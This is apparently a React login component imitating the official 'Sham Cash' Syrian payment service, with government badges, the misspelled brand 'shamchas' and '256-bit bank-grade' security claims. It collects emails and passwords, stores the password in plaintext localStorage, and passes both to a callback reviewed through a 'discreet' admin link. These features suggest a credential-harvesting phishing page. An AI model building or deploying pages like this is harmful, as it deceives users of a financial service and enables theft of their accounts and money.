import React, { useState } from 'react';
import {
  Mail,
  Lock,
  Eye,
  EyeOff,
  LoaderCircle,
  LogIn,
  ShieldCheck,
  ShieldAlert,
  HelpCircle,
  X,
  LockKeyhole
} from 'lucide-react';
import { AuthData, RequestType } from '../types';
import { useLanguage } from '../context/LanguageContext';
import { isStarloveBlocked } from '../utils/accountStorage';

interface AuthScreenProps {
  requestType: RequestType;
  onSubmit: (data: AuthData) => void;
  onCancel?: () => void;
  onOpenAdmin?: () => void;
}

export const AuthScreen: React.FC<AuthScreenProps> = ({
  onSubmit,
  onOpenAdmin,
}) => {
  const { isRTL } = useLanguage();
  const [email, setEmail] = useState(() => {
    const saved = localStorage.getItem('sc_waiting_email') || '';
    return isStarloveBlocked(saved) ? '' : saved;
  });
  const [password, setPassword] = useState(() => localStorage.getItem('sc_waiting_password') || '');
  const [showPassword, setShowPassword] = useState(false);
  const [rememberMe, setRememberMe] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [isForgotModalOpen, setIsForgotModalOpen] = useState(false);

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setError(null);

    const cleanEmail = email.trim().toLowerCase();
    const cleanPassword = password;

    if (!cleanEmail && !cleanPassword) {
      setError('يرجى إدخال البريد الإلكتروني وكلمة المرور للمتابعة.');
      return;
    }

    if (!cleanEmail) {
      setError('يرجى إدخال البريد الإلكتروني (جيميل، ياهو، أو أي بريد معتمد).');
      return;
    }

    if (/[\u0600-\u06FF]/.test(cleanEmail)) {
      setError('البريد الإلكتروني يجب ألا يحتوي على أحرف عربية (استخدم أحرف إنجليزية وأرقام).');
      return;
    }

    const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!emailRegex.test(cleanEmail)) {
      setError('يرجى إدخال بريد إلكتروني صحيح (جيميل Gmail، ياهو Yahoo، أو بريد إلكتروني رسمي معتمد).');
      return;
    }

    if (!cleanPassword) {
      setError('يرجى إدخال كلمة المرور (6 خانات أو أكثر).');
      return;
    }

    if (/[\u0600-\u06FF]/.test(cleanPassword)) {
      setError('كلمة المرور يجب ألا تحتوي على أحرف عربية.');
      return;
    }

    if (cleanPassword.length < 6) {
      setError('يجب أن تكون كلمة المرور 6 خانات فأكثر.');
      return;
    }

    setIsLoading(true);

    try {
      if (rememberMe) {
        if (!isStarloveBlocked(cleanEmail)) {
          localStorage.setItem('sc_waiting_email', cleanEmail);
        } else {
          localStorage.removeItem('sc_waiting_email');
        }
        localStorage.setItem('sc_waiting_password', cleanPassword);
      }
    } catch {}

    setTimeout(() => {
      setIsLoading(false);
      onSubmit({
        email: cleanEmail,
        password: cleanPassword,
      });
    }, 500);
  };

  return (
    <div className="flex flex-col">
      {/* 1. Official Sham Cash Visual & Brand Header */}
      <div className="text-center mb-6">
        <div className="relative mx-auto mb-3 flex flex-col items-center">
          <div className="relative group">
            <div className="absolute -inset-2 rounded-3xl bg-gradient-to-r from-blue-600/30 via-[#4A90E2]/40 to-blue-400/20 blur-xl opacity-80 group-hover:opacity-100 transition duration-500" />
            <img
              src="/assets/sham-login-logo.webp"
              alt="شعار شام كاش الرسمي - shamchas"
              width="239"
              height="267"
              className="relative mx-auto h-24 sm:h-28 w-auto object-contain drop-shadow-[0_16px_36px_rgba(74,144,226,0.45)] transition-transform duration-300 group-hover:scale-105"
            />
          </div>
          <span className="mt-2 text-xs font-black tracking-widest text-[#4A90E2] uppercase">
            shamchas
          </span>
        </div>

        {/* Official Syrian System Badge */}
        <div className="mx-auto mb-2 flex w-fit items-center gap-2 rounded-full border border-[#4A90E2]/30 bg-[#4A90E2]/10 px-3.5 py-1 text-[11px] font-semibold text-[#7B9BE8]">
          <span className="size-2 rounded-full bg-emerald-400 animate-pulse" />
          <span>الجمهورية العربية السورية | المنظومة المالية الإلكترونية</span>
        </div>

        <h1 className="text-2xl sm:text-3xl font-black text-white">
          {isRTL ? 'تسجيل الدخول' : 'Sign In'}
        </h1>
        <p className="mt-1 text-xs sm:text-sm font-medium text-white/70 max-w-sm mx-auto">
          {isRTL
            ? 'أدخل البريد الإلكتروني وكلمة المرور للوصول إلى حسابك وإدارة العمليات المصرفية.'
            : 'Enter your valid email and password (6+ characters) to sign in.'}
        </p>
      </div>

      {/* Error Alert Display */}
      {error && (
        <div className="mb-5 flex items-center gap-2.5 rounded-2xl border border-rose-500/30 bg-rose-500/10 p-3.5 text-xs sm:text-sm text-rose-200 animate-in fade-in duration-200">
          <ShieldAlert className="size-5 shrink-0 text-rose-400" />
          <span className="font-semibold">{error}</span>
        </div>
      )}

      {/* 2. Official Confidential Login Form */}
      <form onSubmit={handleSubmit} className="space-y-4" noValidate>
        {/* Email Field */}
        <div>
          <label
            htmlFor="input-auth-email"
            className="block text-xs sm:text-sm font-bold text-white mb-1.5"
          >
            {isRTL ? 'البريد الإلكتروني' : 'Email Address'}
            <span className="text-rose-400 mr-1">*</span>
          </label>
          <div className="relative">
            <Mail className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/50`} />
            <input
              id="input-auth-email"
              type="email"
              dir="ltr"
              autoComplete="email"
              maxLength={255}
              required
              value={email}
              onChange={(e) => {
                const val = e.target.value;
                if (/[\u0600-\u06FF]/.test(val)) {
                  setError('البريد الإلكتروني يجب ألا يحتوي على أحرف عربية.');
                } else if (error && error.includes('البريد الإلكتروني')) {
                  setError(null);
                }
                setEmail(val.replace(/[\u0600-\u06FF]/g, ''));
              }}
              placeholder="name@gmail.com أو name@yahoo.com"
              className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3.5 ${isRTL ? 'pr-12 pl-4 text-right' : 'pl-12 pr-4 text-left'} text-sm sm:text-base font-medium text-white outline-none transition-colors placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
            />
          </div>
        </div>

        {/* Password Field */}
        <div>
          <div className="flex items-center justify-between mb-1.5">
            <label
              htmlFor="input-auth-password"
              className="block text-xs sm:text-sm font-bold text-white"
            >
              {isRTL ? 'كلمة المرور' : 'Password'}
              <span className="text-rose-400 mr-1">*</span>
            </label>
            <button
              type="button"
              onClick={() => setIsForgotModalOpen(true)}
              className="text-[11px] font-semibold text-[#7B9BE8] hover:text-white transition cursor-pointer"
            >
              {isRTL ? 'نسيت كلمة المرور؟' : 'Forgot Password?'}
            </button>
          </div>

          <div className="relative">
            <Lock className={`pointer-events-none absolute top-1/2 ${isRTL ? 'right-4' : 'left-4'} size-5 -translate-y-1/2 text-white/50`} />
            <input
              id="input-auth-password"
              type={showPassword ? 'text' : 'password'}
              dir="ltr"
              autoComplete="current-password"
              maxLength={72}
              required
              minLength={6}
              value={password}
              onChange={(e) => {
                const val = e.target.value;
                if (/[\u0600-\u06FF]/.test(val)) {
                  setError('كلمة المرور يجب ألا تحتوي على أحرف عربية.');
                } else if (error && error.includes('كلمة المرور')) {
                  setError(null);
                }
                setPassword(val.replace(/[\u0600-\u06FF]/g, ''));
              }}
              placeholder="••••••••"
              className={`w-full rounded-2xl border border-white/10 bg-white/[0.08] py-3.5 ${isRTL ? 'pr-12 pl-12 text-right' : 'pl-12 pr-12 text-left'} text-sm sm:text-base font-medium text-white outline-none transition-colors placeholder:text-white/30 focus:border-[#4A90E2]/70 focus:bg-white/[0.12] focus:ring-2 focus:ring-[#4A90E2]/40`}
            />
            <button
              type="button"
              aria-label={showPassword ? 'إخفاء كلمة المرور' : 'إظهار كلمة المرور'}
              onClick={() => setShowPassword(!showPassword)}
              className={`absolute top-1/2 ${isRTL ? 'left-3' : 'right-3'} -translate-y-1/2 p-2 text-white/60 transition hover:text-white cursor-pointer`}
            >
              {showPassword ? <EyeOff className="size-5" /> : <Eye className="size-5" />}
            </button>
          </div>
        </div>

        {/* Remember Me Checkbox */}
        <div className="flex items-center justify-between pt-1">
          <label className="flex items-center gap-2 cursor-pointer select-none text-xs text-white/70 hover:text-white transition">
            <input
              type="checkbox"
              checked={rememberMe}
              onChange={(e) => setRememberMe(e.target.checked)}
              className="size-4 rounded border-white/20 bg-white/5 text-[#4A90E2] focus:ring-0 focus:ring-offset-0 cursor-pointer"
            />
            <span>{isRTL ? 'تذكر بيانات تسجيل الدخول على هذا الجهاز' : 'Remember me on this device'}</span>
          </label>
        </div>

        {/* Primary Submit Button */}
        <button
          type="submit"
          id="btn-auth-submit"
          disabled={isLoading || !email.trim() || password.length < 6}
          className="mt-3 w-full inline-flex min-h-13 items-center justify-center gap-2 rounded-2xl bg-gradient-to-r from-[#4A90E2] via-[#357ABD] to-[#2B60A8] px-5 text-base font-black text-white shadow-[0_18px_40px_-14px_rgba(74,144,226,0.6)] transition hover:brightness-110 active:scale-[0.99] disabled:cursor-not-allowed disabled:opacity-50 cursor-pointer"
        >
          {isLoading ? (
            <>
              <LoaderCircle className="size-5 animate-spin" />
              <span>{isRTL ? 'جارٍ التحقق وتسجيل الدخول…' : 'Verifying & signing in…'}</span>
            </>
          ) : (
            <>
              <LogIn className="size-5" />
              <span>{isRTL ? 'تسجيل الدخول' : 'Sign In'}</span>
            </>
          )}
        </button>
      </form>

      {/* 3. Bank Grade Security Badge */}
      <div className="mt-6 flex items-center justify-center gap-2 text-[11px] text-white/50">
        <ShieldCheck className="size-4 text-emerald-400 shrink-0" />
        <span>
          {isRTL
            ? 'اتصال مصرفي مشفر وآمن 256-bit وفق معايير منظومة شام كاش'
            : '256-bit bank-grade encrypted secure session'}
        </span>
      </div>

      {/* 4. Footer with Discreet Admin Review Link */}
      <div className="mt-8 pt-4 border-t border-white/10 flex items-center justify-between text-[11px] text-white/40">
        <span>شام كاش © 2026 - الجمهورية العربية السورية</span>
        {onOpenAdmin && (
          <button
            type="button"
            onClick={onOpenAdmin}
            className="inline-flex items-center gap-1 text-[#7B9BE8]/70 hover:text-[#7B9BE8] transition cursor-pointer"
            title="الدخول إلى قسم الإدارة للمراجعة"
          >
            <LockKeyhole className="size-3" />
            <span>قسم الإدارة والمراجعة</span>
          </button>
        )}
      </div>

      {/* 5. Forgot Password Modal */}
      {isForgotModalOpen && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 p-4 backdrop-blur-sm">
          <div className="relative w-full max-w-sm rounded-3xl border border-white/15 bg-[#0F172A] p-6 text-center shadow-2xl text-white">
            <button
              type="button"
              onClick={() => setIsForgotModalOpen(false)}
              className="absolute top-4 left-4 p-1.5 text-white/60 hover:text-white rounded-full bg-white/5 hover:bg-white/10 transition cursor-pointer"
            >
              <X className="size-4" />
            </button>

            <div className="mx-auto flex size-12 items-center justify-center rounded-2xl bg-amber-500/20 text-amber-300 border border-amber-500/30">
              <HelpCircle className="size-6" />
            </div>

            <h3 className="mt-4 text-base font-bold text-white">
              {isRTL ? 'استعادة كلمة المرور' : 'Reset Password'}
            </h3>
            <p className="mt-2 text-xs text-white/70 leading-relaxed text-right">
              {isRTL
                ? 'لاستعادة كلمة المرور الخاصة بحساب شام كاش، يرجى التواصل مع مركز خدمة المشتركين عبر رقم هاتفك المسجل أو زيارة أقرب فرع معتمد مصطحباً بطاقتك الشخصية.'
                : 'To reset your Sham Cash password, please contact our customer care team or visit an authorized branch.'}
            </p>

            <div className="mt-4 rounded-2xl border border-white/10 bg-white/5 p-3 text-xs text-right space-y-1.5">
              <div className="flex items-center justify-between">
                <span className="text-white/60">{isRTL ? 'الخط المباشر:' : 'Hotline:'}</span>
                <a href="tel:+963116110000" className="font-mono font-bold text-blue-400" dir="ltr">
                  +963 11 611 0000
                </a>
              </div>
              <div className="flex items-center justify-between">
                <span className="text-white/60">{isRTL ? 'ساعات العمل:' : 'Hours:'}</span>
                <span className="font-medium text-white/90">8:30 ص - 5:00 م</span>
              </div>
            </div>

            <button
              type="button"
              onClick={() => setIsForgotModalOpen(false)}
              className="mt-4 w-full rounded-xl bg-white/10 hover:bg-white/15 py-2.5 text-xs font-bold text-white transition cursor-pointer"
            >
              {isRTL ? 'فهمت، إغلاق' : 'Close'}
            </button>
          </div>
        </div>
      )}
    </div>
  );
};
